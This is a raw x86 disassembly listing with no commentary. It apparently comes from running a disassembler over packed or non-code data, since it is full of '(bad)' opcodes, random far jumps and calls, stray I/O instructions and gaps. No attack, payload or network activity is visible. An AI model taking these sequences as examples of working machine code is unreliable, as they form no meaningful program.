  42bcdf:	mov    WORD PTR [edx+0x2363c218],cs
  42bce5:	ds cld 
  42bce7:	sti    
  42bce8:	xchg   esp,eax
  42bce9:	inc    eax
  42bcea:	jo     0x42bc6f
  42bcec:	mov    ah,0xd4
  42bcee:	and    ah,BYTE PTR [ebx]
  42bcf0:	xor    bh,BYTE PTR [ecx-0x38284ac1]
  42bcf6:	jmp    0x8e14:0x8b0f9afa
  42bcfd:	(bad)  
  42bcfe:	and    BYTE PTR [ecx],dh
  42bd00:	mov    ecx,0xea7df0f2
  42bd05:	push   ds
  42bd06:	dec    esp
  42bd07:	jo     0x42bd79
  42bd09:	shl    DWORD PTR [ebx+0x6e],0x61
  42bd0d:	sbb    al,0x11
  42bd0f:	mov    edi,0x0
	...
  42bd74:	mov    al,0xb6
  42bd76:	pushf  
  42bd77:	adc    al,0x9e
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bda3
  42bd81:	sub    DWORD PTR [esi+0x1d4d874],edi
  42bd87:	add    BYTE PTR [ecx+eax*1],al
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	inc    ebx
  42bd8d:	je     0x42bd2c
  42bd8f:	std    
  42bd90:	xchg   edi,eax
  42bd91:	repnz mov DWORD PTR [esi],eax
  42bd94:	mov    ds:0xef092e3,al
  42bd99:	or     eax,0x55e7adfd
  42bd9e:	adc    eax,DWORD PTR [edx-0x2764a0d5]
  42bda4:	jmp    0x42be03
  42bda6:	adc    edi,DWORD PTR [edi+0x42]
  42bda9:	jle    0x42bdd8
  42bdab:	aas    
  42bdac:	cmc    
  42bdad:	jnp    0x42bd57
  42bdaf:	dec    edi
  42bdb0:	jnp    0x42be00
  42bdb2:	je     0x42bd47
  42bdb4:	xor    BYTE PTR [eax+0x2b],bh
  42bdb7:	cmp    dl,al
  42bdb9:	or     eax,0xa4c73feb
  42bdbe:	mov    esp,0xa1d148ea
  42bdc3:	(bad)  
  42bdc4:	clc    
  42bdc5:	push   ecx
  42bdc6:	push   ebx
  42bdc7:	out    0x2,al
  42bdc9:	les    esp,FWORD PTR [eax+0x241aa5ca]
  42bdcf:	dec    edi
  42bdd0:	adc    al,0x81
  42bdd2:	aad    0x3e
  42bdd4:	lods   al,BYTE PTR ds:[esi]
  42bdd5:	sbb    DWORD PTR [eax],ecx
  42bdd7:	lods   eax,DWORD PTR ds:[esi]
  42bdd8:	addr16 mov ds:0x919d,eax
  42bddc:	mov    cl,0x30
  42bdde:	add    DWORD PTR [ebx],edi
  42bde0:	push   ds
  42bde1:	pop    es
  42bde2:	jbe    0x42bd90
  42bde4:	xor    eax,0x66b367af
  42bde9:	outs   dx,DWORD PTR ds:[si]
  42bdeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bdec:	jg     0x42bdc4
  42bdee:	mov    edi,DWORD PTR [esi+0x18ed2492]
  42bdf4:	(bad)  fs:[eax-0x31]
  42bdf8:	dec    edx
  42bdf9:	fisubr DWORD PTR [ecx-0x39]
  42bdfc:	dec    esi
  42bdfd:	fsub   QWORD PTR [edi+0x1a0766fe]
  42be03:	cmp    al,BYTE PTR [esi+0x1ea7973]
  42be09:	inc    ebx
  42be0a:	xor    BYTE PTR [ecx+ebp*1+0x5b],0xc0
  42be0f:	mov    DWORD PTR [edi+ebp*4+0x36],edx
  42be13:	cld    
  42be14:	add    al,0x1b
  42be16:	sub    eax,0x458b14a4
  42be1b:	xchg   esi,eax
  42be1c:	dec    esp
  42be1d:	pop    DWORD PTR [edx]
  42be1f:	jns    0x42bda5
  42be21:	call   0x748f3b50
  42be26:	xchg   edi,eax
  42be27:	or     DWORD PTR [ebp-0x5ff86463],ecx
  42be2d:	dec    edx
  42be2e:	call   0x8b7e:0xa5d38f11
  42be35:	jle    0x42bdfd
  42be37:	jle    0x42be6c
  42be39:	bound  ebp,QWORD PTR [ebp-0x4b]
  42be3c:	je     0x42be4a
  42be3e:	and    eax,0x7f32f574
  42be43:	xor    eax,0x799695ca
  42be48:	aas    
  42be49:	adc    BYTE PTR [ebx],dh
  42be4b:	ins    DWORD PTR es:[edi],dx
  42be4c:	cmp    eax,0x566d8229
  42be51:	jl     0x42be13
  42be53:	jmp    0x42be34
  42be55:	sub    eax,0x2fbad74c
  42be5a:	mov    cl,BYTE PTR [esi]
  42be5c:	lods   eax,DWORD PTR ds:[esi]
  42be5d:	xchg   esp,eax
  42be5e:	test   al,0x85
  42be60:	adc    al,dh
  42be62:	mov    eax,ds:0xa425f9a5
  42be67:	sub    esi,DWORD PTR [eax-0x54cd1cfb]
  42be6d:	arpl   WORD PTR [esp+esi*1],cx
  42be70:	stos   BYTE PTR es:[edi],al
  42be71:	jl     0x42bee9
  42be73:	(bad)
  42be76:	xor    BYTE PTR [ecx-0x20d7a423],al
  42be7c:	jmp    0xf015e97f
  42be81:	xchg   ecx,eax
  42be82:	xor    eax,DWORD PTR [ebx+0x46]
  42be85:	arpl   cx,cx
  42be87:	push   eax
  42be88:	jp     0x42beff
  42be8a:	adc    edi,DWORD PTR [edi+0x3a]
  42be8d:	mov    BYTE PTR [edx+0xf9],al
	...
  42bef3:	add    BYTE PTR [edi-0x825b8e0],dl
  42bef9:	call   FWORD PTR [edi-0x28375c93]
  42beff:	jnp    0x42bf39
  42bf01:	in     eax,dx
  42bf02:	int3   
  42bf03:	paddusb mm2,mm5
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	push   ecx
  42bf0d:	ins    BYTE PTR es:[edi],dx
  42bf0e:	inc    ebp
  42bf0f:	jnp    0x42becd
  42bf11:	mov    ch,0xac
  42bf13:	call   0x59ed:0xbf7d570b
  42bf1a:	pusha  
  42bf1b:	fstp   TBYTE PTR [ecx-0xf]
  42bf1e:	or     dh,BYTE PTR [ebx]
  42bf20:	dec    esp
  42bf21:	adc    BYTE PTR [ebp+0x1db67329],cl
  42bf27:	mov    ds:0x19555634,al
  42bf2c:	mov    ds:0x4b97817,al
  42bf31:	popa   
  42bf32:	inc    esi
  42bf33:	xchg   ebx,eax
  42bf34:	cmp    DWORD PTR [edi+ebp*8],edi
  42bf37:	push   es
  42bf38:	pusha  
  42bf39:	fstp   TBYTE PTR [ecx]
  42bf3b:	pop    eax
  42bf3c:	push   esp
  42bf3d:	fs loop 0x42bed9
  42bf40:	cld    
  42bf41:	xchg   DWORD PTR [esi+0x0],esp
  42bf44:	(bad)  
  42bf45:	aad    0xe0
  42bf47:	gs xchg ecx,eax
  42bf49:	xchg   ebp,eax
  42bf4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf4b:	arpl   WORD PTR [ebp-0x57],si
  42bf4e:	call   0x8851:0x6b0aeff1
  42bf55:	je     0x42bf1a
  42bf57:	inc    eax
  42bf58:	int    0xbc
  42bf5a:	outs   dx,DWORD PTR ds:[esi]
  42bf5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf5c:	ret    0xf7f8
  42bf5f:	adc    DWORD PTR [ecx+0x5b420a73],edx
  42bf65:	(bad)  
  42bf67:	pop    edx
  42bf68:	mov    bh,cl
  42bf6a:	scas   eax,DWORD PTR es:[edi]
  42bf6b:	aam    0x5f
  42bf6d:	enter  0x536a,0x58
  42bf71:	pop    ss
  42bf72:	push   ebp
  42bf73:	fucomip st,st(5)
  42bf75:	mov    bh,bh
  42bf77:	in     al,0x2b
  42bf79:	lds    eax,FWORD PTR [ebx+0xf637a83]
  42bf7f:	add    al,0xaa
  42bf81:	push   esp
  42bf82:	jp     0x42bfe0
  42bf84:	test   BYTE PTR [edx+0x15524c34],dh
  42bf8a:	sbb    esi,DWORD PTR [ebx-0x36ca7c5c]
  42bf90:	fdiv   st(1),st
  42bf92:	pop    ds
  42bf93:	adc    eax,0xe8915254
  42bf98:	dec    edi
  42bf99:	pop    esp
  42bf9a:	inc    eax
  42bf9b:	pop    esp
  42bf9c:	scas   eax,DWORD PTR es:[edi]
  42bf9d:	add    cl,ah
  42bf9f:	mov    WORD PTR [edx+0x2],ss
  42bfa2:	inc    ecx
  42bfa3:	adc    BYTE PTR [edx],bh
  42bfa5:	push   eax
  42bfa6:	int    0x35
  42bfa8:	pop    es
  42bfa9:	loopne 0x42bf4a
  42bfab:	out    0xdc,eax
  42bfad:	arpl   WORD PTR [ebx-0x5a],si
  42bfb0:	std    
  42bfb1:	fst    DWORD PTR [ecx]
  42bfb3:	jne    0x42bf4f
  42bfb5:	ret    
  42bfb6:	jo     0x42bf7d
  42bfb8:	push   0x46
  42bfba:	int3   
  42bfbb:	aam    0x83
  42bfbd:	xchg   esi,eax
  42bfbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bfbf:	psllq  mm7,0x28
  42bfc3:	test   DWORD PTR [edx],eax
  42bfc5:	ror    BYTE PTR [ebx-0x52],1
  42bfc8:	and    cl,BYTE PTR [ebx-0x23bb4662]
  42bfce:	das    
  42bfcf:	cwde   
  42bfd0:	mov    bh,0xb4
  42bfd2:	test   ebp,edx
  42bfd4:	cmp    eax,0x1552a213
  42bfd9:	xor    eax,0xe789f3c
  42bfde:	cs dec ecx
  42bfe0:	xchg   esp,eax
  42bfe1:	and    eax,0xea43f061
  42bfe6:	fwait
  42bfe7:	cli    
  42bfe8:	adc    eax,esp
  42bfea:	jns    0x42c00d
  42bfec:	or     ebx,ecx
  42bfee:	lea    ecx,[esi-0x1e4e62bf]
  42bff4:	dec    ecx
  42bff5:	ja     0x42bfe7
  42bff7:	push   edi
  42bff8:	dec    ecx
  42bff9:	loopne 0x42c06c
  42bffb:	rcr    BYTE PTR [esi+eax*8-0x2b],cl
  42bfff:	gs out dx,al
  42c001:	or     al,0x3d
  42c003:	add    al,0xfd
  42c005:	cmp    DWORD PTR [ebx+0x4],0x6115ce25
  42c00c:	xor    cl,BYTE PTR [esi+edi*4-0x1b]
	...
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	mov    al,0x95
  42c082:	addr16 out dx,al
  42c084:	loopne 0x42c05c
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    al,0x1
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	mov    bl,ah
  42c08e:	sbb    BYTE PTR [edx-0x3e],ah
  42c091:	fadd   st,st(2)
  42c093:	pop    edi
  42c094:	sar    DWORD PTR ds:[ecx-0x46325c6f],0x5c
  42c09c:	mov    BYTE PTR [eax],bh
  42c09e:	mov    dh,BYTE PTR [edx-0x5f]
  42c0a1:	cmp    eax,edi
  42c0a3:	and    DWORD PTR [ecx+ebx*8],esi
  42c0a6:	jmp    0xedc6d465
  42c0ab:	add    dh,dh
  42c0ad:	jno    0x42c07c
  42c0af:	out    0xe3,eax
  42c0b1:	xchg   ecx,eax
  42c0b2:	or     bl,BYTE PTR [edi]
  42c0b4:	or     BYTE PTR [esi],ah
  42c0b6:	mov    ds:0x8d4e8651,eax
  42c0bb:	sub    DWORD PTR [edx+0xc7302c5],esi
  42c0c1:	enter  0x661,0x6
  42c0c5:	jb     0x42c0ec
  42c0c7:	fsub   st,st(2)
  42c0c9:	out    dx,eax
  42c0ca:	ret    
  42c0cb:	add    al,0xd9
  42c0cd:	jae    0x42c0f6
  42c0cf:	es push 0xfa58871c
  42c0d5:	dec    ebp
  42c0d6:	rcr    DWORD PTR [ebp+eax*2-0x6d],0x5
  42c0db:	inc    edx
  42c0dc:	dec    ecx
  42c0dd:	out    0x48,al
  42c0df:	imul   ebp,DWORD PTR [ebp+0x29]
  42c0e3:	xchg   ecx,eax
  42c0e4:	push   eax
  42c0e5:	sbb    al,0x44
  42c0e7:	xchg   ecx,eax
  42c0e8:	bound  esi,QWORD PTR [edx+0x30e1e18]
  42c0ee:	pop    eax
  42c0ef:	dec    ebx
  42c0f0:	not    DWORD PTR [esi]
  42c0f2:	pop    di
  42c0f4:	jns    0x42c173
  42c0f6:	addr16 aam 0x8b
  42c0f9:	fdivr  st(5),st
  42c0fb:	sar    edi,0xa
  42c0fe:	mov    ds:0x8487d4e6,al
  42c103:	push   ss
  42c104:	jbe    0x42c181
  42c106:	xchg   BYTE PTR [edi],bl
  42c108:	jmp    0x7565:0xb8393a50
  42c10f:	bound  esp,QWORD PTR [ecx+0x79116ab5]
  42c115:	or     BYTE PTR [eax],bl
  42c117:	adc    eax,edi
  42c119:	lods   al,BYTE PTR ds:[esi]
  42c11a:	pop    ss
  42c11b:	dec    esi
  42c11c:	push   eax
  42c11d:	icebp  
  42c11e:	xchg   ebp,eax
  42c11f:	(bad)  
  42c120:	sub    al,0x2e
  42c122:	cmp    ah,0x9c
  42c125:	pop    ss
  42c126:	mov    ebp,0x31ffad1a
  42c12b:	add    BYTE PTR [esi+0x33bbaeb8],dh
  42c131:	fild   DWORD PTR [eax-0x5cf36514]
  42c137:	inc    ecx
  42c138:	xchg   esi,eax
  42c139:	mov    es,WORD PTR [esi+0x37b1c2a1]
  42c13f:	out    dx,eax
  42c140:	call   0x8bc1:0x94ce2f55
  42c147:	es sbb bh,dl
  42c14a:	push   ebp
  42c14b:	cld    
  42c14c:	inc    esp
  42c14d:	mov    ?,WORD PTR [edi+0x12710d2a]
  42c153:	xor    edi,DWORD PTR [esi-0x48]
  42c156:	imul   edi,DWORD PTR [eax],0xffffffcc
  42c159:	xchg   edi,eax
  42c15a:	pop    eax
  42c15b:	out    0x3e,eax
  42c15d:	push   ss
  42c15e:	shl    ah,1
  42c160:	and    BYTE PTR [edi+ebp*8+0x10c51cb8],cl
  42c167:	mov    esp,0x1f1e84a5
  42c16c:	aam    0xb7
  42c16e:	push   cs
  42c16f:	std    
  42c170:	(bad)  
  42c171:	fidiv  DWORD PTR [ebx+0x16289fc4]
  42c177:	mov    ?,WORD PTR [eax-0x48]
  42c17a:	mov    ah,0x50
  42c17c:	jg     0x42c1fb
  42c17e:	je     0x42c1e0
  42c180:	ret    
  42c181:	rol    BYTE PTR [ebx],0x5e
  42c184:	cmp    eax,0x479a190e
  42c189:	adc    cl,al
  42c18b:	hlt    
  42c18c:	popa   
  42c18d:	dec    eax
  42c18e:	xchg   esp,eax
  42c18f:	sbb    BYTE PTR [eax],al
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	hlt    
  42c201:	inc    edx
  42c202:	mov    WORD PTR [edi],cs
  42c204:	in     al,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	lea    ecx,[eax+ebp*8+0x60]
  42c210:	adc    DWORD PTR cs:[edi+0x66],esi
  42c214:	arpl   di,dx
  42c216:	dec    ecx
  42c217:	in     al,dx
  42c218:	fidivr DWORD PTR [edi-0x5b]
  42c21b:	add    DWORD PTR [eax+eiz*8-0x55],0x4be404e
  42c223:	push   cs
  42c224:	pop    ebp
  42c225:	pop    eax
  42c226:	fcmovnb st,st(1)
  42c228:	std    
  42c229:	cmp    DWORD PTR ds:0x67c1731f,0x18
  42c230:	jae    0x42c1c6
  42c232:	sbb    DWORD PTR es:[edi+0x60c7bc81],0xb09f4900
  42c23d:	ret    
  42c23e:	adc    al,dh
  42c240:	fistp  DWORD PTR [eax-0x2d768c82]
  42c246:	jge    0x42c295
  42c248:	add    DWORD PTR [ebx-0x3ac78ead],esp
  42c24e:	or     cl,dl
  42c250:	pop    esi
  42c251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c252:	mov    dl,0x58
  42c254:	cli    
  42c255:	lods   eax,DWORD PTR ds:[esi]
  42c256:	mov    ah,0xab
  42c258:	std    
  42c259:	stc    
  42c25a:	loop   0x42c28e
  42c25c:	outs   dx,BYTE PTR ds:[esi]
  42c25d:	push   esp
  42c25e:	rcr    edx,1
  42c260:	push   ecx
  42c261:	and    DWORD PTR ds:0x4462481,ecx
  42c267:	adc    esi,DWORD PTR [ecx+0x4a]
  42c26a:	rep stos BYTE PTR es:[edi],al
  42c26c:	nop
  42c26d:	hlt    
  42c26e:	and    cl,BYTE PTR [edi-0x4b]
  42c271:	pop    ebp
  42c272:	ins    DWORD PTR es:[edi],dx
  42c273:	xchg   edx,eax
  42c274:	lds    edi,FWORD PTR [esi]
  42c276:	repz xchg edi,eax
  42c278:	xchg   esi,eax
  42c279:	sahf   
  42c27a:	fidiv  WORD PTR [edi-0x35]
  42c27d:	add    DWORD PTR [ebp-0x79],0xffffff83
  42c281:	fwait
  42c282:	(bad)  
  42c283:	imul   DWORD PTR [edi-0x7b]
  42c286:	sbb    DWORD PTR [ecx+0x14],eax
  42c289:	xor    eax,0x7e65dc5e
  42c28e:	in     al,dx
  42c28f:	jbe    0x42c284
  42c291:	mov    ecx,0x97ad48c8
  42c296:	fimul  DWORD PTR [esi]
  42c298:	mov    edx,0x942ee013
  42c29d:	add    al,0xc
  42c29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2a0:	test   al,0xd
  42c2a2:	aam    0x27
  42c2a4:	cwde   
  42c2a5:	(bad)  
  42c2a6:	ficom  DWORD PTR [ebx-0x4b73d9e1]
  42c2ac:	xor    DWORD PTR [edx-0x36],0x4c9fdc2
  42c2b3:	retf   0x92ef
  42c2b6:	jb     0x42c29c
  42c2b8:	loope  0x42c2c0
  42c2ba:	mov    ch,BYTE PTR [eax-0x3b]
  42c2bd:	enter  0xe244,0x22
  42c2c1:	and    eax,0x1d10f05
  42c2c6:	arpl   ax,dx
  42c2c8:	das    
  42c2c9:	fstp   QWORD PTR [eax+eax*2+0x58fa8fea]
  42c2d0:	pop    esp
  42c2d1:	add    BYTE PTR [ebp+0x55],bh
  42c2d4:	dec    edi
  42c2d5:	pop    ecx
  42c2d6:	aam    0xba
  42c2d8:	lock div DWORD PTR [ecx+0x63]
  42c2dc:	in     eax,0x94
  42c2de:	adc    ebp,DWORD PTR [edi]
  42c2e0:	cmc    
  42c2e1:	inc    eax
  42c2e2:	outs   dx,DWORD PTR ds:[esi]
  42c2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2e4:	xchg   esi,eax
  42c2e5:	adc    edx,DWORD PTR [ebp-0x2946c76]
  42c2eb:	xchg   ebp,eax
  42c2ec:	mov    esi,0x6a935ce8
  42c2f1:	fcom   QWORD PTR [edi+0x32ae10aa]
  42c2f7:	ins    DWORD PTR es:[edi],dx
  42c2f8:	mov    DWORD PTR [eax],edx
  42c2fa:	clc    
  42c2fb:	stos   DWORD PTR es:[edi],eax
  42c2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2fd:	popf   
  42c2fe:	sbb    BYTE PTR [eax+0x55d5d51d],0xf4
  42c305:	jo     0x42c2c7
  42c307:	fimul  WORD PTR [eax-0x4a]
  42c30a:	ins    DWORD PTR es:[edi],dx
  42c30b:	js     0x42c325
  42c30d:	add    al,0xd4
  42c30f:	out    0x0,eax
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0x567e04f6
  42c383:	dec    eax
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    BYTE PTR [eax+0x2aa51f0d],al
  42c391:	mov    BYTE PTR [eax+0x4f],dh
  42c394:	push   esp
  42c395:	dec    edi
  42c396:	arpl   ax,dx
  42c398:	scas   eax,DWORD PTR es:[edi]
  42c399:	int3   
  42c39a:	call   0x9c90:0x5127fd08
  42c3a1:	test   eax,ebp
  42c3a3:	adc    al,0xcb
  42c3a5:	es xchg esi,eax
  42c3a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c3a8:	pop    esp
  42c3a9:	and    al,0xf0
  42c3ab:	and    ebp,DWORD PTR [esi+0x61dd84d5]
  42c3b1:	sub    dh,BYTE PTR [esi+edx*8]
  42c3b4:	ret    0xe493
  42c3b7:	and    DWORD PTR [edi+0x28],edi
  42c3ba:	and    eax,0x39224a47
  42c3c0:	jno    0x42c39c
  42c3c2:	push   edi
  42c3c3:	xor    dh,ch
  42c3c5:	pop    edi
  42c3c6:	cwde   
  42c3c7:	mov    ds:0x8d1a5e10,eax
  42c3cc:	adc    al,0xa3
  42c3ce:	lea    edx,ds:0xa1f3148e
  42c3d4:	out    0x14,eax
  42c3d6:	scas   eax,DWORD PTR es:[edi]
  42c3d7:	sti    
  42c3d8:	sbb    eax,0xe073cc24
  42c3dd:	daa    
  42c3de:	jns    0x42c3b7
  42c3e0:	(bad)  
  42c3e1:	fimul  WORD PTR [ecx]
  42c3e3:	test   eax,0x695589b1
  42c3e8:	ds or  ah,0xb6
  42c3ec:	pop    eax
  42c3ed:	aas    
  42c3ee:	xchg   ebx,eax
  42c3ef:	xchg   edi,eax
  42c3f0:	imul   ebp,ebp,0x988a1065
  42c3f6:	sbb    eax,0xc6d2d661
  42c3fb:	in     al,dx
  42c3fc:	repz cmc 
  42c3fe:	or     al,0xdb
  42c400:	les    edx,FWORD PTR [ebx+ebx*4]
  42c403:	mov    cl,0x12
  42c405:	shr    ecx,0xb1
  42c408:	jg     0x42c3cc
  42c40a:	sub    ebx,DWORD PTR [edi+0x462663e5]
  42c410:	mov    al,ds:0xf983d48f
  42c415:	repz pop eax
  42c417:	stos   BYTE PTR es:[edi],al
  42c418:	push   edi
  42c419:	jno    0x42c453
  42c41b:	mov    ch,dh
  42c41d:	sub    BYTE PTR [edx+0x26b330df],dh
  42c423:	out    0x7d,eax
  42c425:	aad    0x14
  42c427:	dec    edi
  42c428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c429:	and    edi,DWORD PTR [ebx]
  42c42b:	fcomp  DWORD PTR [ecx]
  42c42d:	inc    ebp
  42c42e:	daa    
  42c42f:	icebp  
  42c430:	mov    ecx,0x250c995f
  42c435:	(bad)  [edx+0x53]
  42c438:	mov    al,ds:0xadb21d13
  42c43d:	push   ss
  42c43e:	bnd js 0x42c466
  42c441:	dec    ebp
  42c442:	out    0x1c,al
  42c444:	arpl   dx,bx
  42c446:	ret    0x26e4
  42c449:	inc    eax
  42c44a:	lock movs WORD PTR es:[edi],WORD PTR ds:[esi]
  42c44d:	ds rcl BYTE PTR fs:[ebp-0x9de09e7],1
  42c455:	(bad)  
  42c456:	repz push ebp
  42c458:	xlat   BYTE PTR ds:[ebx]
  42c459:	test   BYTE PTR [esi],cl
  42c45b:	(bad)  
  42c45c:	xchg   ecx,eax
  42c45d:	jle    0x42c450
  42c45f:	dec    esp
  42c460:	push   esi
  42c461:	pop    esi
  42c462:	sbb    bl,BYTE PTR [ecx-0x46]
  42c465:	adc    esp,0x2d942bb9
  42c46b:	dec    esp
  42c46c:	push   es
  42c46d:	lds    ebx,FWORD PTR [ecx-0x42154279]
  42c473:	pop    edi
  42c474:	es sar bh,1
  42c477:	fist   DWORD PTR [ebp+0x2fd731b]
  42c47d:	jb     0x42c471
  42c47f:	pop    esi
  42c480:	addr16 mov esi,0xc946691c
  42c486:	adc    BYTE PTR [edi+0x8],cl
  42c489:	push   ebx
  42c48a:	jecxz  0x42c501
  42c48c:	leave  
  42c48d:	xchg   eax,eax
  42c48f:	push   ss
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x5434,0x65
  42c502:	mov    al,0xc6
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	adc    al,0xd5
  42c50e:	mov    DWORD PTR [eax],eax
  42c510:	mov    cl,0x26
  42c512:	jl     0x42c4c4
  42c514:	push   esi
  42c515:	fcmovbe st,st(6)
  42c517:	loope  0x42c508
  42c519:	push   ecx
  42c51a:	test   eax,0x5838c13c
  42c51f:	cmp    ecx,DWORD PTR [edx+0x14]
  42c522:	mov    bl,BYTE PTR [edx+0x13b863e8]
  42c528:	cs pop eax
  42c52a:	pushf  
  42c52b:	jnp    0x42c5a3
  42c52d:	mov    WORD PTR [edi],ds
  42c52f:	lea    ebx,[edx-0x4fa8ac2d]
  42c535:	xor    al,ah
  42c537:	push   ecx
  42c538:	in     eax,dx
  42c539:	jmp    0xd0ec:0x876e25f6
  42c540:	ds jl  0x42c580
  42c543:	imul   esp,DWORD PTR [edi+edi*2-0x3c1b78f7],0xffffffc3
  42c54b:	ins    BYTE PTR es:[edi],dx
  42c54c:	xchg   esp,eax
  42c54d:	out    0x52,al
  42c54f:	(bad)  
  42c550:	or     ah,dh
  42c552:	mov    ch,0x67
  42c554:	push   cs
  42c555:	mov    ch,0xe6
  42c557:	sbb    BYTE PTR [ebx],ah
  42c559:	push   ebx
  42c55a:	(bad)  
  42c55b:	sar    BYTE PTR [esi-0x153a8fe6],cl
  42c561:	enter  0x4c07,0xd7
  42c565:	push   ebx
  42c566:	or     dl,BYTE PTR ds:0xf6e38662
  42c56c:	in     eax,0xb8
  42c56e:	lds    esp,FWORD PTR [ebx-0x2]
  42c571:	xchg   dl,al
  42c573:	inc    edi
  42c574:	jbe    0x42c50f
  42c576:	cmp    al,0x7b
  42c578:	push   edi
  42c579:	inc    ebp
  42c57a:	ret    
  42c57b:	rol    BYTE PTR [ebx-0x8],1
  42c57e:	(bad)  
  42c57f:	loope  0x42c560
  42c581:	pop    ebx
  42c582:	or     ah,cl
  42c584:	mov    cl,0xd
  42c586:	jmp    0x42c5ff
  42c588:	aam    0xd9
  42c58a:	(bad)  
  42c58c:	fadd   QWORD PTR [esi]
  42c58e:	pusha  
  42c58f:	bound  eax,QWORD PTR [ecx-0x7d]
  42c592:	fstp   DWORD PTR [edx+esi*4]
  42c595:	test   al,0x2
  42c597:	pop    esp
  42c598:	outs   dx,DWORD PTR ds:[esi]
  42c599:	fcmovb st,st(2)
  42c59b:	in     al,0x57
  42c59d:	mov    al,ds:0x46ad11ac
  42c5a2:	je     0x42c536
  42c5a4:	pop    ebp
  42c5a5:	or     al,0x98
  42c5a7:	test   al,0xfc
  42c5a9:	cwde   
  42c5aa:	jle    0x42c530
  42c5ac:	push   esp
  42c5ad:	outs   dx,BYTE PTR ds:[esi]
  42c5ae:	pushf  
  42c5af:	cmc    
  42c5b0:	leave  
  42c5b1:	pop    ecx
  42c5b2:	add    al,0x66
  42c5b4:	pop    ss
  42c5b5:	sub    BYTE PTR [ecx-0x70cd9ee9],bl
  42c5bb:	add    eax,0x4719c70
  42c5c0:	popf   
  42c5c1:	fst    DWORD PTR cs:[edx]
  42c5c4:	push   ebp
  42c5c5:	xor    DWORD PTR [eax],edi
  42c5c7:	or     bh,cl
  42c5c9:	cmp    BYTE PTR [ecx],0xfa
  42c5cc:	mov    esi,0xf670cf6a
  42c5d1:	jle    0x42c5ec
  42c5d3:	cmp    BYTE PTR ds:0xa74a33a8,0xb1
  42c5da:	sbb    ebp,DWORD PTR [edx+0xd97a135]
  42c5e0:	cs dec edx
  42c5e2:	xchg   esi,ebx
  42c5e4:	dec    edx
  42c5e5:	(bad)  
  42c5e6:	retf   
  42c5e7:	ret    0xd0d6
  42c5ea:	sub    DWORD PTR [edx],ebx
  42c5ec:	mov    eax,0x9e0b4287
  42c5f1:	loop   0x42c5cd
  42c5f3:	es pop edi
  42c5f5:	iret   
  42c5f6:	in     eax,0xa4
  42c5f8:	xchg   ebp,eax
  42c5f9:	push   ds
  42c5fa:	jmp    0x42c617
  42c5fc:	sub    BYTE PTR [esi-0x232e4e4f],al
  42c602:	xor    cl,BYTE PTR [edi+0x39a840df]
  42c608:	mov    WORD PTR [ebx-0x14372520],ds
  42c60e:	mov    esp,0x33
	...
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x37920395]
  42c681:	push   eax
  42c682:	sar    DWORD PTR [ebp-0x10],cl
  42c685:	fiadd  DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	imul   edi,DWORD PTR [edx-0x77],0xe9b6c2a7
  42c693:	sub    bl,0x16
  42c696:	inc    ecx
  42c697:	mov    WORD PTR [ecx],?
  42c699:	add    BYTE PTR [ebp-0x7cf3d617],bl
  42c69f:	mov    ds:0xb2f6d705,al
  42c6a4:	jl     0x42c631
  42c6a6:	dec    esp
  42c6a7:	not    esi
  42c6a9:	cmp    edx,edx
  42c6ab:	aas    
  42c6ac:	inc    edx
  42c6ad:	inc    edx
  42c6ae:	jns    0x42c683
  42c6b0:	mov    WORD PTR [ecx-0x2c],gs
  42c6b3:	mov    ds:0x3b5e0bdf,eax
  42c6b8:	push   eax
  42c6b9:	adc    DWORD PTR [ebp+0x6dddd59b],ebx
  42c6bf:	jecxz  0x42c669
  42c6c1:	xchg   esp,eax
  42c6c2:	sbb    DWORD PTR [edx+ebx*8+0x71],0x20
  42c6c7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42c6c9:	add    DWORD PTR fs:[eax-0x8],eax
